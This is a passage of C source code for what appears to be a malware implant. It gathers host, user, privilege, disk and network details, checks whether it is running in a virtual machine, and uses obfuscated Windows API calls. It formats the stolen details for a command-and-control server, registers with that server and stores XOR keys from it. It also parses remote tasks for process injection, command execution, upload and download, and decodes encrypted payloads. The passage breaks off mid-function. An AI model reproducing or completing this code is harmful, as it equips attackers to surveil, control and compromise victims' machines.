static void get_linux_network_info(SystemInfo* info) {
    struct ifaddrs* ifaddr;
    info->nb_interfaces = 0;

    if (getifaddrs(&ifaddr) == -1) return;

    for (struct ifaddrs* ifa = ifaddr; ifa != NULL && info->nb_interfaces < MAX_INTERFACES;
         ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        int family = ifa->ifa_addr->sa_family;
        if (family == AF_INET) {
            NetworkInterface* iface = &info->interfaces[info->nb_interfaces];

            strncpy(iface->name, ifa->ifa_name, sizeof(iface->name) - 1);

            char host[NI_MAXHOST];
            if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in),
                           host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST) == 0) {
                strncpy(iface->ip_address, host, sizeof(iface->ip_address) - 1);
            }

            iface->is_up = (ifa->ifa_flags & IFF_UP) != 0;

            // Try to get MAC address
            char mac_path[256];
            snprintf(mac_path, sizeof(mac_path), "/sys/class/net/%s/address", ifa->ifa_name);
            FILE* mac_file = fopen(mac_path, "r");
            if (mac_file) {
                fgets(iface->mac_address, sizeof(iface->mac_address), mac_file);
                iface->mac_address[strcspn(iface->mac_address, "\n")] = 0;
                fclose(mac_file);
            }

            info->nb_interfaces++;
        }
    }

    freeifaddrs(ifaddr);
}

static int check_linux_admin(void) {
    return (geteuid() == 0);
}

#endif


// ============================================================================
// VM DETECTION
// ============================================================================

static int detect_vm(void) {
    #ifdef _WIN32
    // Check for VMware, VirtualBox, etc.
    HKEY hKey;
    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char manufacturer[256];
        DWORD size = sizeof(manufacturer);
        if (myRegQueryValueEx(hKey, "SystemManufacturer", NULL, NULL,
                           (LPBYTE)manufacturer, &size) == ERROR_SUCCESS) {
            myRegCloseKey(hKey);
            if (strstr(manufacturer, "VMware") || strstr(manufacturer, "VirtualBox") ||
                strstr(manufacturer, "QEMU") || strstr(manufacturer, "Xen")) {
                return 1;
            }
        }
        myRegCloseKey(hKey);
    }
    #else
    // Check DMI information
    FILE* fp = fopen("/sys/class/dmi/id/product_name", "r");
    if (fp) {
        char product[256];
        if (fgets(product, sizeof(product), fp)) {
            fclose(fp);
            if (strstr(product, "VMware") || strstr(product, "VirtualBox") ||
                strstr(product, "QEMU") || strstr(product, "KVM")) {
                return 1;
            }
        } else {
            fclose(fp);
        }
    }
    #endif

    return 0;
}


// ============================================================================
// SYSTEM INFO - MAIN COLLECTION FUNCTION
// ============================================================================

int collect_system_info(SystemInfo* info) {
    if (!info) return -1;

    memset(info, 0, sizeof(SystemInfo));

    #ifdef _WIN32
    // Initialize obfuscated API functions first
    if (initialize_sysinfo_api_functions() != 0) {
        return -1;
    }
    #endif

    // Basic info
    info->architecture = detect_architecture();
    info->os = detect_os();

    #ifdef _WIN32
    get_windows_version(info->os_version, sizeof(info->os_version));
    DWORD size = sizeof(info->hostname);
    myGetComputerName(info->hostname, &size);
    size = UNLEN + 1;
    myGetUserName(info->username, &size);
    info->is_admin = check_windows_admin();
    info->uptime_seconds = myGetTickCount64() / 1000;

    get_windows_cpu_info(info);
    get_windows_memory_info(info);
    get_windows_disk_info(info);
    get_windows_network_info(info);
    #else
    get_linux_version(info->os_version, sizeof(info->os_version));
    gethostname(info->hostname, sizeof(info->hostname));

    struct passwd* pw = getpwuid(geteuid());
    if (pw) {
        strncpy(info->username, pw->pw_name, sizeof(info->username) - 1);
    }

    info->is_admin = check_linux_admin();

    get_linux_cpu_info(info);
    get_linux_memory_info(info);
    get_linux_disk_info(info);
    get_linux_network_info(info);
    #endif

    info->is_vm = detect_vm();

    return 0;
}


// ============================================================================
// SYSTEM INFO - PRINT FUNCTION
// ============================================================================

void print_system_info(const SystemInfo* info) {
    if (!info) return;

    printf("\n========================================\n");
    printf("         SYSTEM INFORMATION\n");
    printf("========================================\n\n");

    printf("[+] SYSTEM\n");
    printf("    Architecture:    %s\n", architecture_to_string(info->architecture));
    printf("    OS:              %s\n", os_to_string(info->os));
    printf("    Version:         %s\n", info->os_version);
    printf("    Hostname:        %s\n", info->hostname);
    printf("    Username:        %s\n", info->username);
    printf("    Admin/Root:      %s\n", info->is_admin ? "Yes" : "No");
    printf("    Virtual Machine: %s\n", info->is_vm ? "Yes" : "No");
    printf("    Uptime:          %llu seconds\n\n", (unsigned long long)info->uptime_seconds);

    printf("[+] CPU\n");
    printf("    Model:           %s\n", info->cpu_model);
    printf("    Processors:      %d\n", info->nb_processors);
    printf("    Logical Cores:   %d\n", info->nb_logical_cores);
    if (info->cpu_frequency_mhz > 0) {
        printf("    Frequency:       %llu MHz\n", (unsigned long long)info->cpu_frequency_mhz);
    }
    printf("\n");

    printf("[+] MEMORY\n");
    printf("    Total RAM:       %llu MB\n", (unsigned long long)info->total_ram_mb);
    printf("    Used RAM:        %llu MB\n", (unsigned long long)info->used_ram_mb);
    printf("    Available RAM:   %llu MB\n", (unsigned long long)info->available_ram_mb);
    printf("    Usage:           %d%%\n\n", info->ram_usage_percent);

    printf("[+] DISKS (%d total)\n", info->nb_disks);
    for (int i = 0; i < info->nb_disks; i++) {
        const DiskInfo* disk = &info->disks[i];
        printf("    [%d] %s (%s)\n", i, disk->name, disk->mount_point);
        printf("        Filesystem:  %s\n", disk->filesystem);
        printf("        Total:       %.2f GB\n", disk->total_space / (1024.0 * 1024.0 * 1024.0));
        printf("        Free:        %.2f GB\n", disk->free_space / (1024.0 * 1024.0 * 1024.0));
        printf("        Available:   %.2f GB\n", disk->available_space / (1024.0 * 1024.0 * 1024.0));
    }
    printf("\n");

    printf("[+] NETWORK INTERFACES (%d total)\n", info->nb_interfaces);
    for (int i = 0; i < info->nb_interfaces; i++) {
        const NetworkInterface* iface = &info->interfaces[i];
        printf("    [%d] %s\n", i, iface->name);
        printf("        IP:          %s\n", iface->ip_address);
        printf("        MAC:         %s\n", iface->mac_address);
        printf("        Status:      %s\n", iface->is_up ? "UP" : "DOWN");
    }
    printf("\n========================================\n");
}


// ============================================================================
// SYSTEM INFO - JSON SERIALIZATION
// ============================================================================

int system_info_to_json(const SystemInfo* info, char* buffer, size_t buffer_size) {
    if (!info || !buffer){
        DEBUG("[ERROR] Invalid arguments to system_info_to_json\n");
        return -1;
    }

    int written = 0;
    int ret;

    #define SAFE_APPEND(...) do { \
        ret = snprintf(buffer + written, buffer_size - written, __VA_ARGS__); \
        if (ret < 0) { \
            DEBUG("[ERROR] JSON serialization encoding error\n"); \
            return -1; \
        } \
        if (written + ret >= buffer_size) { \
            DEBUG("[ERROR] JSON buffer overflow: need %d bytes, have %zu\n", written + ret, buffer_size); \
            return -1; \
        } \
        written += ret; \
    } while(0)

    SAFE_APPEND("{\n");
    SAFE_APPEND("  \"architecture\": \"%s\",\n", architecture_to_string(info->architecture));
    SAFE_APPEND("  \"os\": \"%s\",\n", os_to_string(info->os));
    SAFE_APPEND("  \"os_version\": \"%s\",\n", info->os_version);
    SAFE_APPEND("  \"hostname\": \"%s\",\n", info->hostname);
    SAFE_APPEND("  \"username\": \"%s\",\n", info->username);
    SAFE_APPEND("  \"is_admin\": %s,\n", info->is_admin ? "true" : "false");
    SAFE_APPEND("  \"is_vm\": %s,\n", info->is_vm ? "true" : "false");
    SAFE_APPEND("  \"cpu\": {\n");
    SAFE_APPEND("    \"model\": \"%s\",\n", info->cpu_model);
    SAFE_APPEND("    \"processors\": %d,\n", info->nb_processors);
    SAFE_APPEND("    \"logical_cores\": %d\n", info->nb_logical_cores);
    SAFE_APPEND("  },\n");
    SAFE_APPEND("  \"memory\": {\n");
    SAFE_APPEND("    \"total_mb\": %llu,\n", (unsigned long long)info->total_ram_mb);
    SAFE_APPEND("    \"used_mb\": %llu,\n", (unsigned long long)info->used_ram_mb);
    SAFE_APPEND("    \"available_mb\": %llu\n", (unsigned long long)info->available_ram_mb);
    SAFE_APPEND("  },\n");
    SAFE_APPEND("  \"nb_disks\": %d,\n", info->nb_disks);
    SAFE_APPEND("  \"nb_interfaces\": %d\n", info->nb_interfaces);
    SAFE_APPEND("}\n");

    #undef SAFE_APPEND

    DEBUG("[DEBUG] JSON serialization written %d bytes\n", written);
    return 0;
}

/**
 * Convert architecture to simplified string for C2 format
 */
const char* architecture_to_simple_string(Architecture arch) {
    switch (arch) {
        case ARCH_X86:      return "x86";
        case ARCH_X86_64:   return "x86_64";
        case ARCH_ARM:      return "arm";
        case ARCH_ARM64:    return "arm64";
        case ARCH_MIPS:     return "mips";
        case ARCH_PPC:      return "ppc";
        default:            return "unknown";
    }
}

/**
 * Serializes system information to JSON in C2 expected format
 */
int system_info_to_c2_json(const char* agent_id, const SystemInfo* info, char* buffer, size_t buffer_size) {
    if (!agent_id || !info || !buffer) {
        DEBUG("[ERROR] Invalid arguments to system_info_to_c2_json\n");
        return -1;
    }

    int written = 0;
    int ret;

    #define SAFE_APPEND(...) do { \
        ret = snprintf(buffer + written, buffer_size - written, __VA_ARGS__); \
        if (ret < 0) { \
            DEBUG("[ERROR] JSON serialization encoding error\n"); \
            return -1; \
        } \
        if (written + ret >= buffer_size) { \
            DEBUG("[ERROR] JSON buffer overflow: need %d bytes, have %zu\n", written + ret, buffer_size); \
            return -1; \
        } \
        written += ret; \
    } while(0)

    // Root object with agent_id
    SAFE_APPEND("{\n");
    SAFE_APPEND("  \"agent_id\": \"%s\",\n", agent_id);

    // System section
    SAFE_APPEND("  \"system\": {\n");
    SAFE_APPEND("    \"architecture\": \"%s\",\n", architecture_to_simple_string(info->architecture));
    SAFE_APPEND("    \"os\": \"%s\",\n", info->os_version);
    SAFE_APPEND("    \"hostname\": \"%s\",\n", info->hostname);
    SAFE_APPEND("    \"username\": \"%s\",\n", info->username);
    SAFE_APPEND("    \"userType\": \"%s\",\n", info->is_admin ? "Admin" : "User");
    SAFE_APPEND("    \"virtualMachine\": %s,\n", info->is_vm ? "true" : "false");
    SAFE_APPEND("    \"uptimeSeconds\": %llu\n", (unsigned long long)info->uptime_seconds);
    SAFE_APPEND("  },\n");

    // CPU section
    SAFE_APPEND("  \"cpu\": {\n");
    SAFE_APPEND("    \"model\": \"%s\",\n", info->cpu_model);
    SAFE_APPEND("    \"processors\": %d,\n", info->nb_processors);
    SAFE_APPEND("    \"logicalCores\": %d\n", info->nb_logical_cores);
    SAFE_APPEND("  },\n");

    // Memory section
    SAFE_APPEND("  \"memory\": {\n");
    SAFE_APPEND("    \"totalMb\": %llu\n", (unsigned long long)info->total_ram_mb);
    SAFE_APPEND("  },\n");

    // Disks array
    SAFE_APPEND("  \"disks\": [\n");
    for (int i = 0; i < info->nb_disks; i++) {
        const DiskInfo* disk = &info->disks[i];
        SAFE_APPEND("    {\n");
        SAFE_APPEND("      \"name\": \"%s\",\n", disk->name);
        SAFE_APPEND("      \"filesystem\": \"%s\",\n", disk->filesystem);
        SAFE_APPEND("      \"totalGb\": %.2f,\n", disk->total_space / (1024.0 * 1024.0 * 1024.0));
        SAFE_APPEND("      \"freeGb\": %.2f\n", disk->free_space / (1024.0 * 1024.0 * 1024.0));
        SAFE_APPEND("    }%s\n", (i < info->nb_disks - 1) ? "," : "");
    }
    SAFE_APPEND("  ],\n");

    // Network array
    SAFE_APPEND("  \"network\": [\n");
    for (int i = 0; i < info->nb_interfaces; i++) {
        const NetworkInterface* iface = &info->interfaces[i];
        SAFE_APPEND("    {\n");
        SAFE_APPEND("      \"ip\": \"%s\",\n", iface->ip_address);
        SAFE_APPEND("      \"mac\": \"%s\",\n", iface->mac_address);
        SAFE_APPEND("      \"status\": \"%s\"\n", iface->is_up ? "UP" : "DOWN");
        SAFE_APPEND("    }%s\n", (i < info->nb_interfaces - 1) ? "," : "");
    }
    SAFE_APPEND("  ]\n");

    SAFE_APPEND("}\n");

    #undef SAFE_APPEND

    DEBUG("[DEBUG] C2 JSON serialization written %d bytes\n", written);
    return 0;
}


// ============================================================================
// C2 COMMUNICATION STRUCTURES
// ============================================================================

// Decryption key management structure
#define MAX_POLY_KEY_SIZE 32  // 64 hex chars = 32 bytes
typedef struct {
    unsigned char payload_xor_key[MAX_POLY_KEY_SIZE];  // XOR key array for polyalphabetic decryption
    size_t payload_xor_key_len;         // Length of the key in bytes
    char payload_xor_key_str[128];      // String representation from C2
    unsigned long key_received_time;    // Timestamp when key was received
    int is_key_valid;                   // Flag indicating if key is valid
} PayloadDecryptionKeyStore;

// Global decryption key storage
PayloadDecryptionKeyStore g_decryption_key_store = {
    .payload_xor_key = {0},
    .payload_xor_key_len = 0,
    .payload_xor_key_str = {0},
    .key_received_time = 0,
    .is_key_valid = 0
};

typedef struct {
    char agent_id[64];
    char xor_key[128];
    int registered;
} C2RegistrationResponse;

// Task types
typedef enum {
    TASK_NONE = 0,
    TASK_INJECT = 1,
    TASK_EXECUTE_CMD = 2,
    TASK_DOWNLOAD = 3,
    TASK_UPLOAD = 4,
    TASK_SLEEP = 5,
    TASK_EXIT = 6
} TaskType;

typedef struct {
    TaskType type;
    char task_id[64];
    char target_process[256];
    unsigned char* payload;
    size_t payload_size;
    char command[1024];
    int sleep_duration;
} Task;


// ============================================================================
// FUNCTION PROTOTYPES
// ============================================================================

// Injection functions
int initialize_injection_apis(unsigned char xor_key);
int perform_injection(const char* process_name, unsigned char* payload, size_t payload_size);
HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID);

// Task execution
int execute_task(const Task* task, unsigned char xor_function_key, unsigned char xor_process_key);

// Decryption key storage functions
void store_payload_xor_key(const char* xor_key_str);
const unsigned char* get_payload_xor_key(void);
size_t get_payload_xor_key_len(void);
int is_payload_xor_key_valid(void);
void debug_print_key_store(void);
unsigned char parse_xor_key(const char* xor_key_str);

// C2 communication
int parse_c2_response(const char* json, C2RegistrationResponse* response);
int parse_payload_from_response(const char* json, Task* task, const char* xor_key_str);
int register_with_c2(const char* uuid, const char* system_info_json, C2RegistrationResponse* response);
int send_heartbeat_to_c2(const char* agent_id, char* response_buffer, size_t buffer_size);
int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo);


// ============================================================================
// C2 COMMUNICATION FUNCTIONS
// ============================================================================

/**
 * Store the XOR key received from C2 for payload decryption
 * Converts full hex string to byte array for polyalphabetic XOR
 * @param xor_key_str: Hex string representation of the XOR key from C2
 */
void store_payload_xor_key(const char* xor_key_str) {
    if (!xor_key_str) {
        DEBUG("[Key Store] ERROR: NULL xor_key_str passed\n");
        g_decryption_key_store.is_key_valid = 0;
        return;
    }

    // Copy the string representation
    strncpy(g_decryption_key_store.payload_xor_key_str, xor_key_str,
            sizeof(g_decryption_key_store.payload_xor_key_str) - 1);
    g_decryption_key_store.payload_xor_key_str[sizeof(g_decryption_key_store.payload_xor_key_str) - 1] = '\0';

    // Convert entire hex string to byte array
    size_t hex_len = strlen(xor_key_str);
    size_t key_len = hex_len / 2;

    if (key_len > MAX_POLY_KEY_SIZE) {
        DEBUG("[Key Store] Warning: Key too long (%zu bytes), truncating to %d bytes\n", key_len, MAX_POLY_KEY_SIZE);
        key_len = MAX_POLY_KEY_SIZE;
    }

    // Convert hex string to bytes
    int converted = hex_to_bytes(xor_key_str, g_decryption_key_store.payload_xor_key, key_len);
    if (converted < 0) {
        DEBUG("[Key Store] ERROR: Failed to parse hex key string\n");
        g_decryption_key_store.is_key_valid = 0;
        g_decryption_key_store.payload_xor_key_len = 0;
        return;
    }

    g_decryption_key_store.payload_xor_key_len = (size_t)converted;
    g_decryption_key_store.is_key_valid = 1;
    g_decryption_key_store.key_received_time = (unsigned long)time(NULL);

    DEBUG("[Key Store] XOR key stored successfully: %zu bytes\n", g_decryption_key_store.payload_xor_key_len);
    DEBUG("[Key Store] First 4 bytes: 0x%02X 0x%02X 0x%02X 0x%02X\n",
          g_decryption_key_store.payload_xor_key[0],
          g_decryption_key_store.payload_xor_key[1],
          g_decryption_key_store.payload_xor_key[2],
          g_decryption_key_store.payload_xor_key[3]);
}

/**
 * Retrieve the stored XOR key array for payload decryption
 * @return: Pointer to the XOR key array
 */
const unsigned char* get_payload_xor_key(void) {
    return g_decryption_key_store.payload_xor_key;
}

/**
 * Get the length of the stored XOR key
 * @return: Length of the key in bytes
 */
size_t get_payload_xor_key_len(void) {
    return g_decryption_key_store.payload_xor_key_len;
}

/**
 * Check if the stored XOR key is valid
 * @return: 1 if valid, 0 otherwise
 */
int is_payload_xor_key_valid(void) {
    return g_decryption_key_store.is_key_valid;
}

/**
 * Debug function to print key store information
 */
void debug_print_key_store(void) {
    DEBUG("=== Payload Decryption Key Store ===\n");
    DEBUG("  XOR Key Length: %zu bytes\n", g_decryption_key_store.payload_xor_key_len);
    if (g_decryption_key_store.payload_xor_key_len > 0) {
        DEBUG("  XOR Key (first 8 bytes): ");
        size_t display_len = g_decryption_key_store.payload_xor_key_len < 8 ?
                             g_decryption_key_store.payload_xor_key_len : 8;
        for (size_t i = 0; i < display_len; i++) {
            DEBUG("0x%02X ", g_decryption_key_store.payload_xor_key[i]);
        }
        DEBUG("\n");
    }
    DEBUG("  XOR Key (str): %s\n", g_decryption_key_store.payload_xor_key_str);
    DEBUG("  Key Valid: %s\n", g_decryption_key_store.is_key_valid ? "YES" : "NO");
    DEBUG("  Received Time: %lu\n", g_decryption_key_store.key_received_time);
    DEBUG("====================================\n");
}

/**
 * Parse JSON response from C2 server
 * Simple JSON parser for our specific response format
 */
int parse_c2_response(const char* json, C2RegistrationResponse* response) {
    if (!json || !response) return -1;

    memset(response, 0, sizeof(C2RegistrationResponse));
    response->registered = 0;

    // Parse status
    const char* status_pos = strstr(json, "\"status\"");
    if (status_pos) {
        const char* registered_pos = strstr(status_pos, "\"registered\"");
        if (registered_pos) {
            response->registered = 1;
        }
    }

    // Parse agent_id
    const char* agent_id_pos = strstr(json, "\"agent_id\"");
    if (agent_id_pos) {
        const char* value_start = strchr(agent_id_pos, ':');
        if (value_start) {
            value_start = strchr(value_start, '"');
            if (value_start) {
                value_start++;
                const char* value_end = strchr(value_start, '"');
                if (value_end) {
                    size_t len = value_end - value_start;
                    if (len < sizeof(response->agent_id)) {
                        strncpy(response->agent_id, value_start, len);
                        response->agent_id[len] = '\0';
                    }
                }
            }
        }
    }

    // Parse xor_key
    const char* xor_key_pos = strstr(json, "\"xor_key\"");
    if (xor_key_pos) {
        const char* value_start = strchr(xor_key_pos, ':');
        if (value_start) {
            value_start = strchr(value_start, '"');
            if (value_start) {
                value_start++;
                const char* value_end = strchr(value_start, '"');
                if (value_end) {
                    size_t len = value_end - value_start;
                    if (len < sizeof(response->xor_key)) {
                        strncpy(response->xor_key, value_start, len);
                        response->xor_key[len] = '\0';
                        
                        // AUTOMATICALLY STORE THE XOR KEY WHEN RECEIVED FROM C2
                        DEBUG("[C2 Response Parser] XOR key received from C2: %s\n", response->xor_key);
                        store_payload_xor_key(response->xor_key);
                        debug_print_key_store();
                    }
                }
            }
        }
    }

    return response->registered ? 0 : -1;
}

/**
 * Parse task from JSON response
 * Returns 1 if task found, 0 if no task, -1 on error
 */
int parse_task_from_response(const char* json, Task* task) {
    if (!json || !task) return -1;

    memset(task, 0, sizeof(Task));
    task->type = TASK_NONE;

    // Look for "task" field
    const char* task_pos = strstr(json, "\"task\"");
    if (!task_pos) {
        DEBUG("[Task Parser] No task field in response\n");
        return 0; // No task
    }

    // Parse task type
    const char* type_pos = strstr(task_pos, "\"type\"");
    if (type_pos) {
        const char* value_start = strchr(type_pos, ':');
        if (value_start) {
            value_start = strchr(value_start, '"');
            if (value_start) {
                value_start++;

                if (strncmp(value_start, "inject", 6) == 0) {
                    task->type = TASK_INJECT;
                } else if (strncmp(value_start, "execute", 7) == 0) {
                    task->type = TASK_EXECUTE_CMD;
                } else if (strncmp(value_start, "download", 8) == 0) {
                    task->type = TASK_DOWNLOAD;
                } else if (strncmp(value_start, "upload", 6) == 0) {
                    task->type = TASK_UPLOAD;
                } else if (strncmp(value_start, "sleep", 5) == 0) {
                    task->type = TASK_SLEEP;
                } else if (strncmp(value_start, "exit", 4) == 0) {
                    task->type = TASK_EXIT;
                }
            }
        }
    }

    if (task->type == TASK_NONE) {
        DEBUG("[Task Parser] Unknown or missing task type\n");
        return 0;
    }

    // Parse task_id
    const char* id_pos = strstr(task_pos, "\"task_id\"");
    if (id_pos) {
        const char* value_start = strchr(id_pos, ':');
        if (value_start) {
            value_start = strchr(value_start, '"');
            if (value_start) {
                value_start++;
                const char* value_end = strchr(value_start, '"');
                if (value_end) {
                    size_t len = value_end - value_start;
                    if (len < sizeof(task->task_id)) {
                        strncpy(task->task_id, value_start, len);
                        task->task_id[len] = '\0';
                    }
                }
            }
        }
    }

    // Parse type-specific fields
    if (task->type == TASK_INJECT) {
        // Parse target_process
        const char* proc_pos = strstr(task_pos, "\"target_process\"");
        if (proc_pos) {
            const char* value_start = strchr(proc_pos, ':');
            if (value_start) {
                value_start = strchr(value_start, '"');
                if (value_start) {
                    value_start++;
                    const char* value_end = strchr(value_start, '"');
                    if (value_end) {
                        size_t len = value_end - value_start;
                        if (len < sizeof(task->target_process)) {
                            strncpy(task->target_process, value_start, len);
                            task->target_process[len] = '\0';
                        }
                    }
                }
            }
        }

        // Parse payload (base64 encoded)
        const char* payload_pos = strstr(task_pos, "\"payload\"");
        if (payload_pos) {
            const char* value_start = strchr(payload_pos, ':');
            if (value_start) {
                value_start = strchr(value_start, '"');
                if (value_start) {
                    value_start++;
                    const char* value_end = strchr(value_start, '"');
                    if (value_end) {
                        // For now, just note payload length
                        // TODO: Implement base64 decode
                        DEBUG("[Task Parser] Payload found (base64 encoded)\n");
                    }
                }
            }
        }
    } else if (task->type == TASK_EXECUTE_CMD) {
        // Parse command
        const char* cmd_pos = strstr(task_pos, "\"command\"");
        if (cmd_pos) {
            const char* value_start = strchr(cmd_pos, ':');
            if (value_start) {
                value_start = strchr(value_start, '"');
                if (value_start) {
                    value_start++;
                    const char* value_end = strchr(value_start, '"');
                    if (value_end) {
                        size_t len = value_end - value_start;
                        if (len < sizeof(task->command)) {
                            strncpy(task->command, value_start, len);
                            task->command[len] = '\0';
                        }
                    }
                }
            }
        }
    } else if (task->type == TASK_SLEEP) {
        // Parse sleep duration
        const char* duration_pos = strstr(task_pos, "\"duration\"");
        if (duration_pos) {
            const char* value_start = strchr(duration_pos, ':');
            if (value_start) {
                task->sleep_duration = atoi(value_start + 1);
            }
        }
    }

    DEBUG("[Task Parser] Task parsed successfully: type=%d, id=%s\n",
          task->type, task->task_id);
    return 1;
}

/**
 * Simple hex char to byte conversion
 */
int hex_char_to_byte(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/**
 * Convert hex string to bytes
 * Returns number of bytes decoded, or -1 on error
 */
int hex_to_bytes(const char* hex, unsigned char* bytes, size_t max_bytes) {
    if (!hex || !bytes) return -1;

    size_t hex_len = strlen(hex);
    if (hex_len % 2 != 0) return -1; // Hex string must have even length

    size_t byte_count = hex_len / 2;
    if (byte_count > max_bytes) return -1;

    for (size_t i = 0; i < byte_count; i++) {
        int high = hex_char_to_byte(hex[i * 2]);
        int low = hex_char_to_byte(hex[i * 2 + 1]);

        if (high < 0 || low < 0) return -1;

        bytes[i] = (unsigned char)((high << 4) | low);
    }

    return (int)byte_count;
}

/**
 * Base64 decode table
 */
static const unsigned char base64_decode_table[256] = {
    ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,  ['E'] = 4,  ['F'] = 5,  ['G'] = 6,  ['H'] = 7,
    ['I'] = 8,  ['J'] = 9,  ['K'] = 10, ['L'] = 11, ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15,
    ['Q'] = 16, ['R'] = 17, ['S'] = 18, ['T'] = 19, ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
    ['Y'] = 24, ['Z'] = 25, ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29, ['e'] = 30, ['f'] = 31,
    ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35, ['k'] = 36, ['l'] = 37, ['m'] = 38, ['n'] = 39,
    ['o'] = 40, ['p'] = 41, ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45, ['u'] = 46, ['v'] = 47,
    ['w'] = 48, ['x'] = 49, ['y'] = 50, ['z'] = 51, ['0'] = 52, ['1'] = 53, ['2'] = 54, ['3'] = 55,
    ['4'] = 56, ['5'] = 57, ['6'] = 58, ['7'] = 59, ['8'] = 60, ['9'] = 61, ['+'] = 62, ['/'] = 63
};

/**
 * Convert Base64 string to bytes
 * Returns number of bytes decoded, or -1 on error
 */
int base64_to_bytes(const char* base64, unsigned char* bytes, size_t max_bytes) {
    if (!base64 || !bytes) return -1;

    size_t input_len = strlen(base64);
    if (input_len == 0) return 0;

    // Calculate output size
    size_t output_len = (input_len * 3) / 4;

    // Count padding
    if (base64[input_len - 1] == '=') output_len--;
    if (input_len > 1 && base64[input_len - 2] == '=') output_len--;

    if (output_len > max_bytes) return -1;

    size_t j = 0;
    unsigned int bits = 0;
    int bit_count = 0;

    for (size_t i = 0; i < input_len; i++) {
        unsigned char c = base64[i];

        if (c == '=') break; // Padding
        if (c == ' ' || c == '\t' || c == '\r' || c == '\n') continue; // Skip whitespace

        // Check if valid base64 character
        if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
              (c >= '0' && c <= '9') || c == '+' || c == '/')) {
            return -1; // Invalid character
        }

        bits = (bits << 6) | base64_decode_table[c];
        bit_count += 6;

        if (bit_count >= 8) {
            bit_count -= 8;
            if (j >= max_bytes) return -1;
            bytes[j++] = (unsigned char)((bits >> bit_count) & 0xFF);
        }
    }

    return (int)j;
}

/**
 * Check if string is hexadecimal
 */
int is_hex_string(const char* str) {
    if (!str) return 0;
    size_t len = strlen(str);
    if (len == 0 || len % 2 != 0) return 0;

    for (size_t i = 0; i < len; i++) {
        char c = str[i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) {
            return 0;
        }
    }
    return 1;
}

/**
 * Parse XOR key from string to byte
 * Converts hex string to single byte value
 */
unsigned char parse_xor_key(const char* xor_key_str) {
    if (!xor_key_str || strlen(xor_key_str) < 2) {
        DEBUG("[XOR Key Parser - Warning] Invalid XOR key, using default 0x00\n");
        return 0x00;
    }

    // If it's a hex string (e.g., "0x35" or "35")
    const char* hex_start = xor_key_str;
    if (strncmp(xor_key_str, "0x", 2) == 0 || strncmp(xor_key_str, "0X", 2) == 0) {
        hex_start += 2;
    }

    int high = hex_char_to_byte(hex_start[0]);
    int low = hex_char_to_byte(hex_start[1]);

    if (high < 0 || low < 0) {
        DEBUG("[XOR Key Parser - Warning] Failed to parse XOR key, using default 0x00\n");
        return 0x00;
    }

    unsigned char key = (unsigned char)((high << 4) | low);
    DEBUG("[XOR Key Parser] Parsed XOR key: 0x%02X\n", key);
    return key;
}

/**
 * Parse payload from C2 response
 * Format: {"status": "online", "tasks": [], "payload": "hex_string"}
 * The payload is XOR encrypted and must be decrypted with xor_key
 * Returns 1 if payload found, 0 if no payload (null), -1 on error
 */
int parse_payload_from_response(const char* json, Task* task, const char* xor_key_str) {
    if (!json || !task) return -1;

    memset(task, 0, sizeof(Task));
    task->type = TASK_NONE;

    DEBUG("[Payload Parser] Parsing C2 response...\n");

    // Look for "payload" field
    const char* payload_pos = strstr(json, "\"payload\"");
    if (!payload_pos) {
        DEBUG("[Payload Parser] No payload field in response\n");
        return 0;
    }

    // Find the value after "payload":
    const char* value_start = strchr(payload_pos, ':');
    if (!value_start) {
        DEBUG("[Payload Parser] Malformed payload field\n");
        return -1;
    }
    value_start++;

    // Skip whitespace
    while (*value_start == ' ' || *value_start == '\t' || *value_start == '\n' || *value_start == '\r') {
        value_start++;
    }

    // Check if payload is null
    if (strncmp(value_start, "null", 4) == 0) {
        DEBUG("[Payload Parser] Payload is null, no injection to perform\n");
        return 0;
    }

    // Check if payload is an object (new format with "data" field)
    if (*value_start == '{') {
        DEBUG("[Payload Parser] Payload is an object, looking for 'data' field...\n");

        const char* data_pos = strstr(value_start, "\"data\"");
        if (!data_pos) {
            DEBUG("[Payload Parser] No 'data' field in payload object\n");
            return -1;
        }

        const char* data_value_start = strchr(data_pos, ':');
        if (!data_value_start) {
            DEBUG("[Payload Parser] Malformed 'data' field\n");
            return -1;
        }
        data_value_start++;

        while (*data_value_start == ' ' || *data_value_start == '\t' || *data_value_start == '\n' || *data_value_start == '\r') {
            data_value_start++;
        }

        if (*data_value_start != '"') {
            DEBUG("[Payload Parser] 'data' field is not a string\n");
            return -1;
        }
        data_value_start++;

        value_start = data_value_start;
    }
    else if (*value_start == '"') {
        DEBUG("[Payload Parser] Payload is a direct string\n");
        value_start++;
    }
    else {
        DEBUG("[Payload Parser] Payload is neither a string nor an object\n");
        return -1;
    }

    const char* value_end = strchr(value_start, '"');
    if (!value_end) {
        DEBUG("[Payload Parser] Malformed payload string\n");
        return -1;
    }

    size_t encoded_len = value_end - value_start;
    if (encoded_len == 0) {
        DEBUG("[Payload Parser] Empty payload string\n");
        return 0;
    }

    // Copy the encoded string
    char* encoded_string = (char*)malloc(encoded_len + 1);
    if (!encoded_string) {
        DEBUG("[Payload Parser - Error] Failed to allocate memory for encoded string\n");
        return -1;
    }
    strncpy(encoded_string, value_start, encoded_len);
    encoded_string[encoded_len] = '\0';

    // Detect if it's hex or base64
    int is_hex = is_hex_string(encoded_string);
    size_t max_payload_size;

    if (is_hex) {
        DEBUG("[Payload Parser] Detected hex encoding (length: %zu)\n", encoded_len);
        max_payload_size = encoded_len / 2 + 1;
    } else {
